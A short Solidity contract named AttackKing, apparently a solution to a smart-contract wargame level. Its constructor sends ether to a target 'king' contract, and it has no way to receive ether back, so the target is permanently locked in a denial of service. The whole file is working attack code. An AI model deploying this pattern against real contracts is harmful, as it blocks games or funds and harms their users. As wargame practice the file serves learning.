// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    constructor(address _king) payable{
        (bool success,)= payable(_king).call{value:msg.value}("");
        require(success,"transaction failed");
    }
}